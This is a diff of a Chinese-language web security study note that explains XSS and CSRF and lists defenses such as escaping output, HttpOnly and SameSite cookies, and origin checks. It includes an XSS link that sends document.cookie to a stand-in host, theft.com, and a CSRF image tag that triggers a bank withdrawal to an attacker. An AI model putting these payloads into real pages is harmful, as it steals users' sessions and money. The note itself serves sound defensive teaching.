@@ -55,7 +55,6 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 ```html
 <a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
 ```
-
 **1.杜绝源头**
 
 - 存储时进行转义
@@ -66,4 +65,16 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 - 在输出时先对内容（来自url参数或者ajax）进行转义如（ & < > " ' / javascript:）
 - 注意使用eval()、setTimeout()、setInterval()、innerHTML、document.write()等可以执行字符串的代码
 - 由服务端通过Set-Cookie设置httponly，使document.cookie无法获取
-### CSRF（跨域请求伪造）
+### CSRF（跨站请求伪造）
+代表用户在其他地方发起一个伪造的请求，假如在一个没有做输入过滤的论坛上接收到一个消息，该消息为如下代码
+```html
+<img src="http://bank.com/withdraw?account=you&amount=1000000&for=attacker">
+```
+如果此时你正好登录了bank.com且cookie有效，那该条消息会携带cookie向银行服务器发送一个转账的请求，银行通过cookie发现有效，则会执行转账操作
+
+- 尽量减少敏感cookie失效时间
+- cookie设置SameSite为lax同源策略
+- 敏感请求应该提供再次确认，如收到该请求后告知前端需要滑块验证或者输入用户信息，通过后回传才能继续执行
+- 通过请求头origin或者referrer验证请求来源，且改用post方式（虽然请求头可以伪造，但是可以抵挡部分伪造和get请求）
+- 不通过cookie进行认证，可添加一个自定义请求头进行认证，其值为动态生成的随机字符串
+- 输入和输出过滤
